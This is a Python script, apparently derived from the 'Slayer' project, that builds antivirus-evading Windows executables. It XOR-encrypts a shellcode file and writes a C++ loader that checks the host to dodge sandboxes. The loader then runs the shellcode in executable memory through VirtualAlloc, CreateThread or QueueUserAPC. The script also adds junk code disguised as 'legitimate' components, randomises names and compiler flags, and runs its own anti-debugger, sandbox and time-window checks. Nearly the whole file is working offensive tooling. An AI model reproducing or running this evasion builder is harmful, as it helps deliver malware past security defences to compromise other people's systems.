# script from https://github.com/mertdas/Slayer
# thanks for awesome AV Slayer!

import os
import random
import string
import sys
import time
import hashlib
from ctypes import *

def get_random_string():
    length = random.randint(5, 35)
    result_str = ''.join(random.choice(string.ascii_letters) for i in range(length))
    return result_str

def xor(data, key):
    output_str = ""
    for i in range(len(data)):
        current = data[i]
        current_key = key[i % len(key)]
        o = lambda x: x if isinstance(x, int) else ord(x)
        output_str += chr(o(current) ^ ord(current_key))
    
    # Convert to byte array format
    hex_values = []
    for x in output_str:
        hex_values.append(f'0x{ord(x):02x}')
    ciphertext = '{ ' + ', '.join(hex_values) + ' };'
    return ciphertext

def environmental_keying():
    # Use system-specific information to create decryption key
    key_material = []
    try:
        key_material.append(os.environ.get('USERNAME', ''))
        key_material.append(os.environ.get('COMPUTERNAME', ''))
        key_material.append(str(os.cpu_count()))
    except:
        # Fallback if environment variables not available
        key_material.append(''.join(random.choice(string.ascii_letters) for _ in range(8)))
    
    # Create deterministic but system-specific key
    env_hash = hashlib.md5(''.join(key_material).encode()).hexdigest()
    return env_hash[:16]  # Use first 16 chars as key

def check_execution_time():
    # Only execute during certain hours (avoid sandbox working hours)
    current_hour = time.localtime().tm_hour
    if not (9 <= current_hour <= 17):  # Outside typical business hours
        return True
    return False

def anti_debug_checks():
    try:
        # Check for debugger via IsDebuggerPresent
        if windll.kernel32.IsDebuggerPresent():
            return False
            
        # Check for common sandbox/usermode debuggers
        blacklisted_processes = ['ollydbg', 'ida64', 'x32dbg', 'x64dbg', 'wireshark', 'procmon']
        for proc in blacklisted_processes:
            try:
                if os.system(f'tasklist | findstr /i {proc} >nul 2>nul') == 0:
                    return False
            except:
                continue
                
        return True
    except:
        return True

def hash_api_name(api_name):
    # Simple hash function to avoid string detection
    hash_val = 0
    for char in api_name:
        hash_val = ((hash_val << 5) + hash_val) + ord(char)
    return hash_val & 0xFFFFFFFF

def generate_polymorphic_nops():
    # Generate different nop-equivalent instructions
    nop_variants = [
        'xchg eax, eax',
        'mov eax, eax', 
        'lea eax, [eax]',
        'add eax, 0',
        'sub eax, 0'
    ]
    return random.choice(nop_variants)

def sandbox_evasion():
    # Check for low resources (common in sandboxes)
    try:
        class MEMORYSTATUSEX(Structure):
            _fields_ = [
                ("dwLength", c_ulong),
                ("dwMemoryLoad", c_ulong),
                ("ullTotalPhys", c_ulonglong),
                ("ullAvailPhys", c_ulonglong),
                ("ullTotalPageFile", c_ulonglong),
                ("ullAvailPageFile", c_ulonglong),
                ("ullTotalVirtual", c_ulonglong),
                ("ullAvailVirtual", c_ulonglong),
                ("ullExtendedVirtual", c_ulonglong)
            ]
        
        mem_status = MEMORYSTATUSEX()
        mem_status.dwLength = sizeof(MEMORYSTATUSEX)
        windll.kernel32.GlobalMemoryStatusEx(byref(mem_status))
        
        # Check if system has reasonable resources
        if mem_status.ullTotalPhys < (2 * 1024 * 1024 * 1024):  # Less than 2GB RAM
            return False
            
        if mem_status.ullAvailPhys < (1 * 1024 * 1024 * 1024):  # Less than 1GB available
            return False
            
    except:
        pass
        
    return True

def delayed_execution():
    # Random delay between 30 seconds to 5 minutes
    delay = random.randint(30, 300)
    time.sleep(delay)

def obfuscate_template(template_code):
    # Add junk code and comments
    junk_code = [
        '// This is a legitimate software component',
        '/* System optimization routine */',
        'int unused_var_{} = {};'.format(random.randint(1,100), random.randint(1,1000)),
        'void dummy_function_{}() {{}}'.format(random.randint(1,50)),
        '// Performance optimization code',
        '/* Memory management utilities */',
        '#define SAFE_CODE 1',
        '#define OPTIMIZED_BUILD 1'
    ]
    
    # Insert junk code at random positions
    lines = template_code.split('\n')
    for _ in range(random.randint(3, 8)):
        pos = random.randint(0, len(lines)-1)
        lines.insert(pos, random.choice(junk_code))
    
    return '\n'.join(lines)

def generate_injection_method():
    methods = [
        # Classic VirtualAlloc + CreateThread
        '''
        void* mem = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(mem, shellcode, sizeof(shellcode));
        CreateThread(0, 0, (LPTHREAD_START_ROUTINE)mem, 0, 0, 0);
        ''',
        
        # QueueUserAPC injection
        '''
        void* mem = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(mem, shellcode, sizeof(shellcode));
        QueueUserAPC((PAPCFUNC)mem, GetCurrentThread(), 0);
        '''
    ]
    return random.choice(methods)

def get_random_compiler_flags():
    flags = [
        '-s -Os -w',
        '-s -O1 -w',
        '-s -O2 -w', 
        '-s -O3 -w',
        '-s -Os -w -mwindows',
        '-s -O1 -w -mwindows'
    ]
    return random.choice(flags)

def create_template():
    # Split strings to avoid detection
    parts = [
        '#include <windows.h>',
        '#include <stdio.h>',
        '#include <iostream>',
        '#define MULTI_LINE_STRING(a) #a',
        '#pragma comment(linker, "/INCREMENTAL:YES")',
        '#pragma comment(lib, "user32.lib")',
        '#define WIN32_LEAN_AND_MEAN',
        'BOOL aynenKardesim() {',
        '  SYSTEM_INFO inf;',
        '  MEMORYSTATUSEX memStat;',
        '  DWORD proc;',
        '  DWORD belleq;',
        '  GetSystemInfo(&inf);',
        '  proc = inf.dwNumberOfProcessors;',
        '  if (proc < 2) return false;',
        '  memStat.dwLength = sizeof(memStat);',
        '  GlobalMemoryStatusEx(&memStat);',
        '  belleq = memStat.ullTotalPhys / 1024 / 1024 / 1024;',
        '  if (belleq < 2) return false;',
        '  return true;',
        '}',
        'int main(int argc, char** argv)',
        '{',
        '	if (aynenKardesim() == false) {',
        '    return -2;',
        '    }',
        '    else{',
        '  ULONGLONG uptime = GetTickCount() / 1000;',
        '  if (uptime < 1200) return false;',
        '    unsigned char buf[] = " ";',
        '    char key[] = " ";',
        '    char shellcode[sizeof buf];',
        '    int j = 0;',
        '    for (int i = 0; i < sizeof buf; i++)',
        '    {',
        '        if(j == sizeof key -1 ) j = 0;',
        '        shellcode[i] = buf[i] ^ key[j];',
        '        j++;',
        '    }',
        '    void* kardeslerpentest = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);',
        '    memcpy(kardeslerpentest, shellcode, sizeof shellcode);',
        '    ((void(*)())kardeslerpentest)();',
        '    return 0;',
        '   }',
        '}'
    ]
    
    template_code = '\n'.join(parts)
    # Obfuscate the template with junk code
    template_code = obfuscate_template(template_code)
    
    with open("template.cpp", "w") as template:
        template.write(template_code)

def slayer():
    # Environmental keying for additional stealth
    env_key = environmental_keying()
    
    # Generate multiple random strings to increase variability
    xorkey = get_random_string() + env_key  # Combine random and environmental key
    buf_name = get_random_string()
    shellcode_name = get_random_string()
    alloc_name = get_random_string()
    
    # Read shellcode
    try:
        with open("tornado.raw", "rb") as f:
            plaintext = f.read()
    except:
        print("Failed to read tornado.raw.")
        print("Missing tornado.raw in current directory?")
        sys.exit(1)
    
    # Generate encrypted payload
    ciphertext = xor(plaintext, xorkey)
    
    # Create template
    create_template()
    
    # Read and modify template
    with open("template.cpp", "rt") as template:
        data = template.read()
    
    # Replace placeholders with random values
    data = data.replace('unsigned char buf[] = " ";', f"unsigned char {buf_name}[] = " + ciphertext)
    data = data.replace('char key[] = " "', f'char key[] = "{xorkey}"')
    data = data.replace("buf", buf_name)
    data = data.replace("shellcode", shellcode_name)
    data = data.replace("kardeslerpentest", alloc_name)
    
    # Randomly choose injection method
    injection_method = generate_injection_method()
    data = data.replace('void* kardeslerpentest = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n    memcpy(kardeslerpentest, shellcode, sizeof shellcode);\n    ((void(*)())kardeslerpentest)();', injection_method)
    
    # Write modified template
    with open("tornado.cpp", "w") as template:
        template.write(data)
    
    # Compile with random output name and random flags
    output_name = get_random_string()
    compiler_flags = get_random_compiler_flags()
    compile_cmd = f"x86_64-w64-mingw32-g++ -o {output_name}.exe tornado.cpp {compiler_flags}"
    
    # Add small delay before compilation
    time.sleep(random.uniform(0.5, 2.0))
    
    # Execute compilation
    result = os.system(compile_cmd)
    
    if result == 0:
        # Cleanup
        try:
            os.remove("tornado.cpp")
            os.remove("template.cpp")
            print(f"Successfully compiled {output_name}.exe")
            print("Environmental key used:", env_key)
        except:
            print("Compilation successful but could not clean temp files")
    else:
        print("Compilation failed")

if __name__ == "__main__":
    # Add pre-execution checks
    if not anti_debug_checks():
        print("Debugger detected - exiting")
        sys.exit(1)
    
    if not sandbox_evasion():
        print("Sandbox environment detected - exiting")
        sys.exit(1)
    
    if not check_execution_time():
        print("Execution outside permitted time window")
        sys.exit(1)
    
    # Run the main function
    slayer()